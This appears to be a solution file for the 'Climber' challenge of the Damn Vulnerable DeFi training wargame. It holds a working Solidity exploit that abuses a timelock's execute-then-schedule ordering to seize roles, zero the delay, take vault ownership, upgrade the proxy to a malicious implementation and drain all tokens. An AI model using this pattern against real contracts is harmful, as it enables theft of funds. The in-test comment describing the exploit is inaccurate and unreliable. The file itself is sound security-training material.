// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract ClimberExploiter {

    ClimberVault vault;
    ClimberTimelock timelock;
    address recovery;
    DamnValuableToken token;

    address[]  targets = new address[](4);
    uint256[]  values = new uint256[](4);
    bytes[] data = new bytes[](4);

    constructor(ClimberVault _vault, ClimberTimelock _timelock, address _recovery, DamnValuableToken _token) {
        vault = _vault;
        timelock = _timelock;
        recovery = _recovery;
        token = _token;
    }
    
    function exploit() external{
        address maliciousImpl = address(new MaliciousVault());


        targets[0] = address(timelock);
        values[0] = 0;
        data[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),         
            address(this)               
        );

        targets[1] = address(timelock);
        values[1] = 0;
        data[1] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)             
        );

        targets[2] = address(vault);
        values[2] = 0;
        data[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );


        targets[3] = address(this);
        values[3] = 0;
        data[3] = abi.encodeWithSignature(
            "timelockSchedule()"
        );

        timelock.execute(targets, values, data, bytes32(0));
        
        vault.upgradeToAndCall(address(maliciousImpl), "");

        MaliciousVault(address(vault)).drainFunds(address(token), recovery);

        

    }

    // This function is called in the last step of the timelock.execute
    // to schedule the operation after it has been executed
    function timelockSchedule() external {
        timelock.schedule(targets, values, data, bytes32(0));
    }


}

  contract MaliciousVault is ClimberVault {

        function drainFunds(address token, address receiver) external {
            SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
        }

  }



contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        // Exploit: The exploit works by scheduling a series of operations through the timelock contract
        // that ultimately allow the attacker to drain the vault's funds. The attacker first proposes a change
        // to the vault's withdrawal logic, allowing them to withdraw all funds without proper authorization.
        // Once the proposal is approved, the attacker can execute the withdrawal and drain the vault.

        ClimberExploiter exploiter = new ClimberExploiter(
            vault, timelock, recovery, token
        );

        exploiter.exploit();

       

    }


    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
